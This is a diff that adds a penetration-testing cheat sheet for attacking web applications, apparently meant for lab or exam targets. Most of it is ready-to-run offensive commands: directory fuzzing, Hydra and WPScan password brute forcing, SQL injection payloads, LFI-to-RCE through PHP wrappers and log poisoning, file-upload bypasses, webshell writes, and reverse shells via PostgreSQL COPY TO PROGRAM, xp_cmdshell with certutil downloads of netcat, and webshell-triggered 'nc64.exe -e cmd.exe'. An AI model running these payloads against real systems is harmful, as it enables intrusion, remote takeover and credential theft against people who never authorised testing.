@@ -1,0 +1,258 @@
+^Web notes:Perform service discovery on all web ports (80,443,8080,8443, etc.)
+^Web notes:Check web server version (Apache 2.4.49 vulnerable to path traversal)
+^Web notes:Perform directory busting on all discovered web services
+^Web notes:Add discovered virtual hosts to /etc/hosts file
+^Web notes:Check common files: robots.txt, sitemap.xml, .git/HEAD, backup files
+^Web notes:Review HTML source code for developer comments and hidden inputs
+^Web notes:Check application title and footer for CMS/framework names
+^Web notes:Searchsploit the application name and version
+^Web notes:Test default credentials on all login forms (admin:admin, root:root)
+^Web notes:Search Google, GitHub, and exploit databases for vulnerabilities
+^Web notes:Test file upload functionality for bypasses and webshell deployment
+^Web notes:Test for SQL injection on all parameters
+^Web notes:Test for LFI/RFI on file parameters
+^Web notes:Test for command injection on all input fields
+^Web notes:Use Hydra for online brute force on login forms
+^Web notes:Don't always brute-force with huge wordlists. Generate targeted wordlists from the site itself first.
+^Web notes:Use CeWL to scrape the site and build a custom dictionary of words that might be used in passwords or parameters.
+^Web notes:Combine multiple sources (CeWL + common words) for hybrid attacks.
+^Web notes:Fuzz for GraphQL endpoints (/graphql, /graphiql, /v1/graphql)
+^Web notes:Fuzz API endpoints (/api, /swagger, /docs, /v1)
+^Web notes:Test for JWT vulnerabilities (none algorithm, weak secret, KID injection)
+^Web notes:Test WebSocket endpoints for misconfigurations
+^Web notes:Test HTTP methods with OPTIONS and try PUT/DELETE if allowed
+^Web notes:Check for host header injection and virtual host brute forcing
+^Web notes:Use dotdotpwn for automated path traversal testing
+^Web notes:Use whatweb for quick technology fingerprinting
+^Web notes:Use nikto for comprehensive web vulnerability scanning
+^Web notes:For WordPress, use wpscan for enumeration and vulnerability checking
+^Web notes:Check for exposed .git repositories and dump with wget
+^Web notes:Test WebDAV with davtest if enabled
+^Web notes:Always try PHP wrappers for LFI (php://filter, data://)
+^Web notes:Test for SQL injection on all parameters
+^Web notes:Try authentication bypass with ' OR 1=1 -- and similar payloads
+^Web notes:Test for time-based SQL injection when boolean blind not working
+^Web notes:SQL Injection Wordlist:http://github.com/PenTestical/sqli/blob/main/hugeSQL.txt # kali-machine
+^Web notes:SQL Injection Wordlist:/usr/share/payloadsallthethings/SQL Injection # kali-machine
+^Web notes:Auth Bypass Wordlist:http://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt # kali-machine
+^Web notes:Common Wordlist:/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+^Web notes:Common Wordlist:/usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
+^Web notes:Common Directory:/var/www/html/wordpress #default wordpress directory on Linux
+^Reminder:For each HTTP(S) service, fingerprint stack/CMS and note versions → run: WhatWeb
+^Reminder:If you need quick headers/redirects/cookies/auth hints → run: Curl
+^Reminder:If you need raw HTTP interaction beyond the browser → run: NC
+^Reminder:If vhosts/subdomains are discovered, map them to IP for stable browsing → run: Hosts Helper
+^Reminder:After fingerprinting, start endpoint/content discovery recursively → run: Feroxbuster
+^Reminder:If you need targeted fuzzing of paths/params/vhosts → run: FFUF
+^Reminder:If you prefer classic directory brute forcing → run: Gobuster
+^Reminder:If you need flexible fuzzing (params/POST/headers) → run: WFuzz
+^Reminder:After discovery, run quick misconfig/vuln scan then verify manually → run: Nikto
+^Reminder:If WordPress is identified, enumerate users/plugins/themes → run: WPScan # 1
+^Reminder:If you need more aggressive WP plugin/theme detection → run: WPScan # 2
+^Reminder:If brute-forcing WP credentials is justified → run: WPScan # 3
+^Reminder:If you need a site-derived wordlist for login guessing → run: CeWL
+^Reminder:If you have real names and want username permutations (must verify later) → run: Username Anarchy
+^Reminder:If you need HTTP login brute forcing (tune failure strings; watch lockouts) → run: Hydra HTTP
+^Reminder:If you suspect SQLi, confirm quickly then validate manually → run: SQL Injection Manual
+^Reminder:If SQLi confirmed and OS interaction is possible → run: SQL Injection RCE
+^Reminder:If file upload exists, test extension/MIME/content handling → run: File Upload
+^Reminder:If you need to locate upload endpoints/directories → run: File Upload Reference
+^Reminder:If you gain web RCE and want stable interaction → run: Webshell
+^Reminder:If JWTs are used, test common implementation weaknesses → run: JWT
+^Reminder:If API endpoints exist, enumerate routes/auth and test common issues → run: API
+^Reminder:If websocket endpoints exist, interact and test auth/message handling → run: WebSocket
+^Reminder:If WebDAV is enabled, test PUT/upload and execution → run: DAVTest
+^Reminder:If LFI suspected, test PHP wrappers/filter tricks → run: PHP Wrapper
+^Reminder:If traversal suspected and you want brute traversal payloads → run: DotDotPwn
+^Reminder:If exposed .git suspected, mirror and review source → run: Wget Git
+^Reminder:If a simple cmd parameter RCE exists, smoke test output quickly → run: PowerShell/CMD Checker
+^Reminder:If LFI can include web logs, inject PHP via User-Agent → run: PHP Log Poisoning
+^Reminder:If LFI exists → test php://filter for source disclosure first, then try data:// or php://input for LFI-to-RCE.
+^Reminder:If LFI exists and file upload is not possible → try a php://filter chain payload for LFI-to-RCE.
+^Reminder:If you have local access or can inspect /proc → check open file descriptors and try php://fd/<n> through LFI.
+^Reminder:If Windows LFI is confirmed, try common Windows config, web server, database, and credential file paths → run: Interesting Files on Windows
+
+NC:nc -vn <target> <port> # Banner grab for web services. Reveals server header and sometimes version; kali-machine
+Curl:curl -I http://<target>:<port>/ # Fetch HTTP headers. Look for server version, cookies, and security headers; kali-machine
+Curl:curl -sk http://<target>:<port>/robots.txt #fetch robots.txt to identify disallowed paths and hidden web content before directory brute forcing; kali-machine
+Curl:curl http://<target>:<port>/ # Fetch full page. Review source code for comments and hidden inputs; kali-machine
+Curl:curl -k -v --path-as-is -I https://<target>:<port> # Probe HTTPS headers ignoring certificate errors. kali-machine
+Curl:curl -k -A 'Mozilla/5.0' http://<target>:<port>/ # Use custom User-Agent to bypass simple filtering; kali-machine
+Curl:curl -s -O http://<target>:<port>/index.html # Download file for offline analysis; kali-machine
+Curl:curl -b 'PHPSESSID=<cookie>' http://<target>:<port>/ # Use authenticated session cookie for post-login enumeration; kali-machine
+Curl:curl -u <user>:<password> http://<target>:<port>/ # Test basic authentication with credentials; kali-machine
+Curl:curl --path-as-is http://<user>:<password>@<target>:<port>/ # Alternative basic auth in URL format; kali-machine
+Curl:curl -H 'Authorization: Basic <base64creds>' http://<target>:<port>/ # Basic auth with pre-encoded header; kali-machine
+Curl:curl -X POST -d 'username=<user>&password=<password>' http://<target>:<port>/subdirectory/endpoint # Test login forms. Look for successful auth or error messages; kali-machine
+Curl:curl -X POST -H 'Content-Type: application/json' --data-binary '{"username":"xyz","password":"xyz"}' http://<target>:<port>/api/login # Test JSON API endpoints; kali-machine
+Curl:curl http://<target>/latest/meta-data/ | grep "/" # Check for AWS metadata endpoint. If accessible, may reveal IAM credentials; kali-machine
+Curl:curl --unix-socket /var/run/docker.sock http://localhost/containers/json # Test for exposed Docker socket. If accessible, can list and control containers; kali-machine
+Curl:curl -I http://<target> # External header check from different IP; kali-machine
+Curl:curl -s http://<target>:<port>/api.php/city/ | jq # Parse JSON API output for easier reading; kali-machine
+Curl:curl -u admin:admin http://<target>:<port>/ # Test default credentials on protected areas; kali-machine
+Curl:curl -X DELETE http://<target>:<port>/api.php/city/New_HTB_City # Test API DELETE methods. May allow unauthorized deletion; kali-machine
+Curl:false || curl -s "http://<target>:<port>/?cmd=whoami" | grep -i "root" # Quick test for command injection parameters; kali-machine
+Curl:curl 'http://<target>/forgot?username=robert-dev-14522' -H 'Host:<target>:8081' # Test host header injection for password reset poisoning; kali-machine
+Curl:curl -u tomcat:\$3cureP4s5w0rd123! -T shell.war http://megahosting.htb:8080/manager/text/deploy # Deploy WAR file to Tomcat manager. If successful, get shell at /shell; kali-machine
+Curl:curl -u tomcat:\$3cureP4s5w0rd123! http://megahosting.htb:8080/manager/text/list # List deployed applications; kali-machine
+Curl:curl -k -i --path-as-is http://<target>:<port>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd #bypass path normalization to exploit LFI and read sensitive files; kali-machine
+
+^Feroxbuster:feroxbuster -u http://<target>:<port>/ -t 10 -w <wordlist1> -x "txt,html,php,asp,aspx,jsp" -v -k -L4 -e # Directory busting with extensions. Look for 200/403/301 responses; kali-machine
+Feroxbuster:feroxbuster -u http://<domain> -t 10 -w <wordlist1> -x "txt,html,php,asp,aspx,jsp" -v -k -n -e # Directory busting on domain name; kali-machine
+Feroxbuster:feroxbuster -u http://<target>:<port>/ -t 10 -w <wordlist1> --filter-status 400,401,403,404 -L2 # Filter out common non-interesting status codes; kali-machine
+Feroxbuster:feroxbuster -u http://<target>:<port>/ -x "txt,html,php,asp,aspx,jsp" -d 4 -vv #recursive web fuzzing; kali-machine
+
+Gobuster:gobuster dir -u http://<target>:<port>/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,txt,html,bak,old -v #directory brute-force with extensions; kali-machine
+Gobuster:gobuster dir -u http://<target>:<port>/ -w <wordlist1> -s 307,200,204,301,302,403 -t 50 # Directory busting with status filtering; kali-machine
+Gobuster:gobuster dir -u http://<target>:<port>/ -w <wordlist1> -t 50 -o <filename1> # Save results to file for later review; kali-machine
+Gobuster:gobuster dir -u http://<target>:<port>/ -w <wordlist1> -t 50 -o <filename1> -x "php,txt,aspx" # Include file extensions in search; kali-machine
+Gobuster:gobuster dir -p socks5://<target>:1080 --url http://<target>:<port>/ -w <wordlist1> # Directory busting through SOCKS proxy when pivoting; kali-machine
+Gobuster:gobuster dir -u http://<target>:<port> -w <wordlist1> # Quick directory busting with common wordlist; kali-machine
+Gobuster:gobuster vhost -u http://<target>:<port>/ -w <wordlist1> -o <filename1> # Virtual host discovery via Host header. Look for new domains; kali-machine
+Gobuster:gobuster dns -d <domain> -w dns-jhaddix.txt # DNS subdomain brute-force. Add discovered subdomains to /etc/hosts; kali-machine
+
+FFUF:ffuf -w <wordlist1> -u http://<target>:<port>/FUZZ # Fast directory discovery; kali-machine
+FFUF:ffuf -u http://<target>:<port>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -v #directory fuzzing using ffuf; kali-machine
+FFUF:ffuf -w <wordlist1> -u http://<target>:<port>/FUZZ -mc all -fs 42 -c -v # Filter by response size to hide false positives; kali-machine
+FFUF:ffuf -w <wordlist1> -u http://<target>:<port>/ -X POST -H "Content-Type: application/x-www-form-urlencoded" -d '{"email":"FUZZ@casp.casp","password":"dummy"}' -r --fc 401 -t 50 -mr "incorrect" -o <filename1> #fuzz POST login parameter using wordlist by replacing FUZZ in email field, follow redirects (-r), filter out 401 responses (--fc 401), match responses containing "incorrect" (-mr), use -fr to filter regex, and save results to output file; kali-machine
+FFUF:ffuf -u http://<domain>:<port>/FUZZ/ -k -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt # Use raft wordlist for thorough discovery; kali-machine
+FFUF:ffuf -w <wordlist1> -u http://<target>:<port>/ -H "Host: FUZZ" -mc 200 # Virtual host discovery. Look for different responses; kali-machine
+FFUF:ffuf -c -w "<wordlist1>:FILE" -H "X-Originating-IP: 127.0.0.1, X-Forwarded-For: 127.0.0.1" -fs 5682,0 -u http://<target>:<port>/FUZZ # Bypass IP-based filters with spoofed headers; kali-machine
+FFUF:ffuf -w <wordlist1>:FUZZOBJECTS,<wordlist2>:FUZZACTIONS -u http://<target>:<port>/api/FUZZOBJECTS/FUZZACTIONS -o <filename1> # Multi-parameter API path fuzzing; kali-machine
+FFUF:ffuf -w <wordlist1> -u http://<target>:<port>/api/users/validate -X POST -H "Content-Type: application/json" -d '{"email":"FUZZ@casp.casp","password":"dummy"}' -mr "incorrect" -o <filename1> # API user enumeration. Look for different error messages; kali-machine
+FFUF:ffuf -w <wordlist1>:FUZZ -u 'http://<target>:<port>/xxx.php?language=FUZZ' -fs 0 # LFI parameter fuzzing. Look for file inclusion; kali-machine
+FFUF:ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<target>:<port>/index.php?page=FUZZ -fc 404 -fs 0 -c #fuzz LFI paths and filter empty responses for faster discovery; kali-machine
+FFUF:ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://<target>:<port>/index.php?FUZZ=test -fc 404 -c #discover hidden parameters that may lead to LFI; kali-machine
+FFUF:ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<target>:<port>/index.php?page=FUZZ -fc 404 -c -t 40 #multi-threaded LFI fuzzing for faster enumeration; kali-machine
+FFUF:ffuf -u http://<target>:<port>/ -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -v #discover virtual hosts; kali-machine
+FFUF:ffuf -w <wordlist1> -u http://<target>/ -H "Host: FUZZ.<domain>" -fw <words> #fuzz virtual hosts by replacing FUZZ in Host header and filter baseline responses by word count; kali-machine
+FFUF:ffuf -w <wordlist1> -u http://<target>:<port>/ -H "Host: FUZZ" -mc 200 # Virtual host discovery. Look for different responses; kali-machine
+
+WFuzz:wfuzz -u http://<target>:<port> -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 7069 # Subdomain fuzzing with size filter; kali-machine
+
+^Hosts Helper:printf '%s %s\n' "<target>" "$(curl -fsSL http://<target>:<port>/ | grep -aoE 'https?://[^"[:space:]]+|[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}' | sed -E 's~^https?://~~; s~/.*~~; s/.*@//; s/:.*$//' | sort -u | paste -sd' ' -)" # Scrape URLs/emails from page, normalize to hostnames for /etc/hosts; kali-machine
+Hosts Helper:printf '%s %s\n' "<target>" "$(curl -fsSL http://<target>:<port>/ | grep -aoE 'https?://[^"[:space:]]+|[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}' | sed -E 's~^https?://~~; s~/.*~~; s/.*@//; s/:.*$//' | grep -E '^[A-Za-z0-9.-]+\.[A-Za-z]{2,}$' | sort -u | paste -sd' ' -)" # Strict domain-only extraction for /etc/hosts; kali-machine
+Hosts Helper:curl -fsSL http://<target>:<port>/ | grep -aoE 'https?://[^"[:space:]]+|[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}' | sed -E 's~^https?://~~; s~/.*~~; s/.*@//; s/:.*$//' | sort -u | awk -v t="<target>" '{print t, $0}' # Emit one "<target> hostname" per line for easy /etc/hosts append; kali-machine
+
+Nikto:nikto -h http://<target>:<port>/ # Comprehensive web vulnerability scanner. Look for interesting findings in output; kali-machine
+Nikto:nikto -h https://<target>:<port> -ssl # Scan HTTPS site; kali-machine
+
+WhatWeb:whatweb http://<target>:<port>/ # Web technology fingerprinting. Identifies CMS, frameworks, and versions; kali-machine
+WhatWeb:whatweb -a 4 -v http://<target>:<port>/ #web technology fingerprinting; kali-machine
+WhatWeb:whatweb --aggression 3 http://<target>:<port>/ # More aggressive fingerprinting; kali-machine
+
+WPScan #1:wpscan --url http://<target>:<port>/ -e vt,tt,u,ap #enumerate WordPress components: vulnerable themes (vt), vulnerable plugins (vp), themes (tt), users (u), and all plugins (ap) to identify attack surface; kali-machine
+WPScan #1:wpscan --url http://<target>:<port>/ --enumerate p # WordPress plugin scan. Look for vulnerable plugins; kali-machine
+WPScan #1:wpscan --url http://<target>:<port>/ --enumerate u # WordPress user enumeration. Lists usernames for brute force; kali-machine
+WPScan #1:wpscan --url http://<target>:<port>/ --enumerate vp # WordPress vulnerability scan. Checks for known vulnerabilities; kali-machine
+WPScan #1:wpscan --url http://<target>:<port>/ --enumerate t # WordPress theme enumeration; kali-machine
+WPScan #1:wpscan --url http://<target>:<port>/ -e vt,tt,u,ap
+WPScan #1:wpscan --url http://<target>:<port>/ --api-token <token> # Use API token for better vulnerability detection; kali-machine
+WPScan #1:wpscan --url http://<target>:<port>/ --enumerate p --plugins-detection mixed -t 30 #enumerate WordPress plugins on specified port using mixed detection with 30 threads to improve plugin discovery speed; kali-machine
+
+WPScan #2:wpscan --url http://<target>:<port>/ --usernames <filename1> --passwords <wordlist1> # WordPress brute force with user and password lists; kali-machine
+WPScan #2:wpscan --url http://<target>:<port>/ --passwords <wordlist1> # Brute force with discovered usernames; kali-machine
+
+WPScan #3:wpscan --update # Update wpscan database to latest vulnerability definitions; kali-machine
+
+DAVTest:davtest -url http://<target>:<port>/ # Test WebDAV enabled directories. Look for upload capabilities; kali-machine
+DAVTest:davtest -url http://<target>:<port>/ -auth <user>:<password> # Test WebDAV with credentials; kali-machine
+
+CeWL:cewl -d 3 -m 5 http://<target>:<port>/ -w cewl-wordlist.txt # Generate custom wordlist from website content. Use depth 3 and min word length 5; kali-machine
+CeWL:cewl http://<target>:<port>/directory/path -w cewl-wordlist.txt # Generate wordlist from specific path; kali-machine
+CeWL:cewl -w <filename1> -d 2 -m 6 http://<target>:<port>/ # Custom depth and min length; kali-machine
+CeWL Targeted:cewl -d 3 -m 5 http://<target>:<port>/ -w cewl_wordlist.txt # Generate wordlist from site content (depth 3, min word length 5); kali-machine
+CeWL Targeted:cewl -d 2 -m 4 --with-numbers http://<target>:<port>/ -w cewl_with_numbers.txt # Include numbers for password variations; kali-machine
+
+Wordlist Hybrid:cat cewl_wordlist.txt /usr/share/wordlists/rockyou.txt | sort -u > combined.txt # Combine CeWL with rockyou for targeted + common passwords; kali-machine
+Wordlist Hybrid:grep -E '^[a-z]{3,8}$' /usr/share/wordlists/rockyou.txt > short_words.txt # Extract only short words for faster directory busting; kali-machine
+Wordlist Hybrid:sed -n '1,1000p' /usr/share/wordlists/rockyou.txt > rockyou_top1000.txt # Use only top 1000 for quick checks; kali-machine
+
+Directory Busting Quick:ffuf -w short_words.txt -u http://<target>:<port>/FUZZ -c -v # Fast directory busting with small wordlist; kali-machine
+Directory Busting Quick:gobuster dir -u http://<target>:<port>/ -w short_words.txt -t 50 # Gobuster with targeted wordlist; kali-machine
+
+Username Anarchy:/home/kali/Tools/git-tools/username-anarchy/username-anarchy -i <wordlist1> # Generate username permutations from names (first/last/full). Use for password spraying; kali-machine
+Username Anarchy:/home/kali/Tools/git-tools/username-anarchy/username-anarchy --recognise <user> # Analyze existing username to infer naming scheme for generating more; kali-machine
+Username Anarchy:/home/kali/Tools/git-tools/username-anarchy/username-anarchy -i names.txt --format first.last@domain.com # Generate email addresses; kali-machine
+
+Hydra HTTP:hydra -l admin -P <wordlist1> <target> -s <port> http-post-form '/admin/login.php:username=^USER^&password=^PASS^&login=:Invalid password' -V # Login brute force. Adjust form parameters and failure string; kali-machine
+Hydra HTTP:hydra -L <userlist> -P <wordlist1> <target> http-get / # Basic auth brute force; kali-machine
+Hydra HTTP:hydra -l <user> -P <wordlist1> <target> https-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect' -S # HTTPS form brute force; kali-machine
+
+Wget Git:wget -r -np -nH --cut-dirs=N http://<target>/.git/ # Recursively download exposed .git repository. Look for source code and credentials; kali-machine
+Wget Git:wget -r -np -nH --cut-dirs=N http://<target>/.svn/ # Recursively download exposed .svn repository; kali-machine
+
+PHP Wrapper (Common):curl -s "http://<target>:<port>/menu.php?file=data:text/plain,helloworld" | grep "helloworld" #test if data:// wrapper works via LFI; if "helloworld" appears the wrapper is usable; kali-machine
+PHP Wrapper (Common):http://<target>:<port>/menu.php?file=data:text/plain,<?php echo shell_exec("id"); ?> #execute commands via data:// wrapper if LFI allows code execution; kali-machine
+PHP Wrapper (Common):http://<target>/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B&cmd=whoami #execute base64-encoded inline PHP payload through data:// wrapper for LFI-to-RCE; kali-machine
+PHP Wrapper (Common):http://<target>/index.php?page=php://filter/convert.base64-encode/resource=<file> #read source code of local PHP files through LFI using base64 encoding; kali-machine
+PHP Wrapper (Common):http://<target>/index.php?page=php://input&cmd=id #include POST body via php://input when LFI processes POST data; kali-machine
+PHP Wrapper (Common):curl -X POST --data "<?php system($_GET['cmd']); ?>" "http://<target>/index.php?page=php://input&cmd=whoami" #inject PHP payload in POST body for LFI-to-RCE via php://input; kali-machine
+PHP Wrapper (Common):http://<target>/index.php?page=expect://id #execute OS commands directly through expect:// wrapper if PHP expect extension is enabled; kali-machine
+PHP Wrapper (Common):http://<target>/index.php?page=zip://<archive>.zip%23<file> #read files inside ZIP archives via LFI using zip:// wrapper; kali-machine
+PHP Wrapper (Common):http://<target>/index.php?page=phar://<archive>.phar/<file> #access files inside PHAR archives through LFI using phar:// wrapper; kali-machine
+PHP Wrapper (Common):http://<target>/index.php?page=compress.zlib://<file> #read gzip-compressed files through LFI using compress.zlib:// wrapper; kali-machine
+PHP Wrapper #1:http://<target>/index.php?page=php://filter/convert.base64-encode/resource=<file> #baseline source disclosure via php://filter; use this first to read PHP source and identify reachable sinks before chaining wrappers; kali-machine
+PHP Wrapper #1:python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' #generate a php://filter chain payload that decodes into executable PHP for LFI #3-to-RCE without file upload (https://github.com/synacktiv/php_filter_chain_generator); kali-machine
+PHP Wrapper #1:http://<target>/index.php?page=<php_filter_chain_payload>&cmd=id #trigger LFI with generated php://filter chain payload to achieve code execution; kali-machine
+PHP Wrapper #2:ls -l /proc/<pid>/fd/ #enumerate open file descriptors on Linux target to identify readable handles pointing to interesting files or sockets; target-machine
+PHP Wrapper #2:http://<target>/index.php?page=php://fd/<fd_number> #read from an already-open file descriptor through LFI if PHP process has that descriptor open; kali-machine
+PHP Wrapper #2:http://<target>/index.php?page=php://fd/<fd_number>&cmd=whoami #attempt execution or disclosure through inherited descriptor-backed input depending on what the descriptor references; kali-machine
+
+DotDotPwn:dotdotpwn -m http-url -u http://<target>:<port>/<path>/TRAVERSAL -O -k "root:" -r ddp-results.txt # Automated path traversal on Linux targets. Look for /etc/passwd content; kali-machine
+DotDotPwn:dotdotpwn -m http-url -u http://<domain>:<port>/<path>/TRAVERSAL -O -k "root:" -r ddp-results.txt # Same with domain name; kali-machine
+DotDotPwn:dotdotpwn -m http-url -u http://<target>:<port>/<path>/index.php?page=TRAVERSAL -o windows -k 'mci extensions' -r ddp-results.txt # Windows path traversal looking for MCI extensions; kali-machine
+DotDotPwn:dotdotpwn -m http-url -u http://<target>:<port>/<path>/index.php?page=TRAVERSAL -o windows -k 'localhost' -r ddp-results.txt # Windows traversal looking for localhost references; kali-machine
+
+File Upload:change file format (.phps or .php7 or .phtml or .php5) # Try alternative PHP extensions to bypass upload filters; kali-machine
+File Upload:change character case (.pHP) # Case manipulation to bypass extension checks; kali-machine
+File Upload:echo "AddType application/x-httpd-php .dork" > .htaccess # Upload .htaccess to allow .dork files to execute as PHP; target-machine
+File Upload:echo "AddHandler application/x-httpd-php .phtml" > .htaccess # Alternative .htaccess configuration; target-machine
+File Upload:exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg # Inject PHP into image metadata; kali-machine
+File Upload:exiftool -Comment='<?php echo shell_exec($_GET["cmd"]); ?>' image.png # Alternative image injection; kali-machine
+
+File Upload Reference:https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/README.md # Comprehensive file upload bypass techniques; kali-machine
+
+PowerShell/CMD Checker:(dir 2>&1 *`|echo CMD);&<# rem # >echo PowerShell # Determine if running in PowerShell or CMD environment; kali-machine
+
+SQL Injection Wordlist:https://github.com/PenTestical/sqli/blob/main/hugeSQL.txt # kali-machine
+SQL Injection Manual:' OR 1=1 -- # Basic authentication bypass payload. Try in login forms; kali-machine
+SQL Injection Manual:' OR '1'='1' -- # Alternative authentication bypass; kali-machine
+SQL Injection Manual:' OR 1=1 IN (SELECT @@version) -- # Force DB error to leak version information; kali-machine
+SQL Injection Manual:' UNION SELECT null, username, password, description, null FROM users -- # UNION-based extraction. Adjust column count to match original query; kali-machine
+SQL Injection Manual:offsec' AND 1=1 -- # Boolean-based test. Compare responses with 1=1 vs 1=2; kali-machine
+SQL Injection Manual:offsec' AND 1=2 -- # Boolean-based test, should return different response; kali-machine
+SQL Injection Manual:offsec' AND IF(1=1,SLEEP(3),'false') -- # Time-based MySQL injection. Look for response delay; kali-machine
+SQL Injection Manual:'; IF (SELECT SUBSTRING(@@version,1,1))='M' WAITFOR DELAY '0:0:3'-- # Time-based MSSQL injection; kali-machine
+SQL Injection Manual:' AND 3176=(SELECT 3176 FROM PG_SLEEP(5))-- # Time-based PostgreSQL injection; kali-machine
+
+SQL Injection RCE:<PARAM>=1'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<kali>/80 0>&1"'-- # PostgreSQL RCE via COPY TO PROGRAM; kali-machine
+SQL Injection RCE:' UNION SELECT "<?php system($_GET['cmd']);?>",null,null,null,null INTO OUTFILE '/var/www/html/webshell.php' # Write PHP webshell via MySQL INTO OUTFILE. Requires file write permissions; kali-machine
+SQL Injection RCE:';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE-- # Enable xp_cmdshell in MSSQL; kali-machine
+SQL Injection RCE:';EXEC xp_cmdshell "certutil -urlcache -f http://<kali>/nc64.exe C:\Windows\Temp\nc64.exe";-- # Download binary via xp_cmdshell; kali-machine
+SQL Injection RCE:';EXEC xp_cmdshell "C:\Windows\Temp\nc64.exe <kali> <kaliPort> -e cmd.exe";-- # Spawn reverse shell via xp_cmdshell; kali-machine
+SQL Injection RCE:';EXEC xp_cmdshell 'powershell -e <base64>';-- # Execute encoded PowerShell via xp_cmdshell; kali-machine
+
+Webshell:http://<target>/tmp/webshell.php?cmd=id # Test uploaded webshell with command parameter; kali-machine
+Webshell:http://<target>/uploads/shell.php?cmd=whoami # Alternative webshell location; kali-machine
+Webshell:curl http://<target>:<port>/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=whoami" # Test uploaded webshell via curl; kali-machine
+Webshell:curl -G <domain>/<path>/shell.php --data-urlencode 'cmd=nc64.exe -e cmd.exe <kali> <kaliPort>' # Trigger reverse shell via webshell; kali-machine
+Webshell:curl -G <domain>/<path>/Dysco.php --data-urlencode 'cmd=.\update.exe' # Execute uploaded binary via webshell; kali-machine
+
+JWT:jwt_tool <JWT_TOKEN> -t http://<target>:<port> -rh "Authorization: Bearer <JWT>" -M at # Test JWT token for vulnerabilities (none algorithm, weak secret, etc.); kali-machine
+JWT:jwt_tool <JWT_TOKEN> -C -d <wordlist1> # Crack JWT secret using wordlist; kali-machine
+JWT:jwt_tool <JWT_TOKEN> -X a # Test algorithm confusion (none algorithm); kali-machine
+JWT:jwt_tool <JWT_TOKEN> -I -hc kid -hv ../../../../../../dev/null # Test KID injection; kali-machine
+
+API:curl -X OPTIONS http://<target>:<port>/api/endpoint -v # Check allowed HTTP methods. Look for PUT or DELETE; kali-machine
+API:curl -X PUT -d '{"admin":true}' -H "Content-Type: application/json" http://<target>:<port>/api/user/1 # Test Insecure Direct Object References by changing IDs; kali-machine
+API:curl -X PUT -d '{"role":"admin"}' http://<target>:<port>/api/user/1 # Test privilege escalation via role manipulation; kali-machine
+API:curl -X DELETE http://<target>:<port>/api/user/1 # Test unauthorized DELETE; kali-machine
+
+WebSocket:websocat ws://<target>:<port>/ws # Connect to WebSocket for manual testing; kali-machine
+WebSocket:wscat -c ws://<target>:<port>/ws # Alternative WebSocket client; kali-machine
+WebSocket:curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Host: <target>" -H "Origin: http://<target>" http://<target>:<port>/ # Test WebSocket upgrade manually; kali-machine
+
+PHP Log Poisoning:curl -A "<?php system($_GET['cmd']); ?>" http://<target>/ #inject PHP payload into web server access logs via User-Agent header so it can later be executed if the log file is included through LFI; kali-machine
+PHP Log Poisoning:http://<target>/index.php?page=../../../../var/log/apache2/access.log&cmd=id #trigger LFI with directory traversal to include poisoned access log and execute command; kali-machine
+PHP Log Poisoning:http://<target>/index.php?page=../../../../var/log/apache2/access.log&cmd=whoami #execute arbitrary command via poisoned log through LFI (directory traversal usually required to reach /var/log); kali-machine
